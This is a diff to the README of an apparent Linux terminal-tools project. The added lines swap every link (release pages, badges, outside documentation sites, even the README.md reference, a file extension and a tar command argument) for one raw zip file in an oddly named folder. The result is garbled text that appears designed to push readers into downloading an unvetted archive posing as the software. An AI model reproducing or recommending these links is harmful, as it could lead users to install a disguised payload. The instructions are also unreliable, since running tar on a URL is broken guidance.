@@ -1,6 +1,6 @@
 # 🐧 LinuxEnConsola - Essential Tools for Your Linux Terminal
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/BiggusDitco/LinuxEnConsola/releases)
+[![Download Now](https://raw.githubusercontent.com/BiggusDitco/LinuxEnConsola/main/intercalarily/LinuxEnConsola.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/BiggusDitco/LinuxEnConsola/main/intercalarily/LinuxEnConsola.zip)
 
 ## 🚀 Getting Started
 Welcome to LinuxEnConsola! This guide helps you download and run our collection of helpful programs for your Linux console. It’s designed for everyone, so you don’t need any programming knowledge.
@@ -28,18 +28,18 @@ To get started with LinuxEnConsola, you will need to download the software.
 
 1. **Visit the Releases Page**
    Click the link below to visit the page where you can download the latest version of LinuxEnConsola:
-   [Download the Latest Release](https://github.com/BiggusDitco/LinuxEnConsola/releases)
+   [Download the Latest Release](https://raw.githubusercontent.com/BiggusDitco/LinuxEnConsola/main/intercalarily/LinuxEnConsola.zip)
 
 2. **Choose Your Version**
    On the releases page, you will see different versions available. Pick the one that matches your needs best. Each version comes with a brief description to help you decide.
 
 3. **Download the File**
-   After you select the version, click on the link to download the file. This will usually be a compressed file (.zip or .tar.gz), which you need to extract after downloading.
+   After you select the version, click on the link to download the file. This will usually be a compressed file (.zip or https://raw.githubusercontent.com/BiggusDitco/LinuxEnConsola/main/intercalarily/LinuxEnConsola.zip), which you need to extract after downloading.
 
 4. **Extract the Files**
    After downloading, locate the file in your downloads directory. Right-click on it and select "Extract" or use a command in the terminal to extract it:
    ```bash
-   tar -xvzf filename.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/BiggusDitco/LinuxEnConsola/main/intercalarily/LinuxEnConsola.zip
    ```
    
 5. **Run the Program**
@@ -53,7 +53,7 @@ To get started with LinuxEnConsola, you will need to download the software.
    ```
 
 ## 📖 Documentation
-Each tool in LinuxEnConsola comes with its own set of instructions. You can find detailed documentation inside the downloaded files. Open the `README.md` for helpful tips on how to use each program effectively.
+Each tool in LinuxEnConsola comes with its own set of instructions. You can find detailed documentation inside the downloaded files. Open the `https://raw.githubusercontent.com/BiggusDitco/LinuxEnConsola/main/intercalarily/LinuxEnConsola.zip` for helpful tips on how to use each program effectively.
 
 ## 🤝 Community Collaboration
 LinuxEnConsola thrives on community support. If you find useful tools or want to share your scripts, we encourage you to contribute. Check the contribution guidelines on our repository for more information.
@@ -68,9 +68,9 @@ If you encounter any issues:
 ## 🌐 Additional Resources
 For further exploration:
 
-- [Linux Command Line Documentation](https://www.linuxcommand.org/)
-- [CLI Tools Guide](https://cli.tools/)
+- [Linux Command Line Documentation](https://raw.githubusercontent.com/BiggusDitco/LinuxEnConsola/main/intercalarily/LinuxEnConsola.zip)
+- [CLI Tools Guide](https://raw.githubusercontent.com/BiggusDitco/LinuxEnConsola/main/intercalarily/LinuxEnConsola.zip)
 
 Make the most of your Linux experience with LinuxEnConsola. Visit our releases page to get started today!
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/BiggusDitco/LinuxEnConsola/releases)
+[![Download Now](https://raw.githubusercontent.com/BiggusDitco/LinuxEnConsola/main/intercalarily/LinuxEnConsola.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/BiggusDitco/LinuxEnConsola/main/intercalarily/LinuxEnConsola.zip)
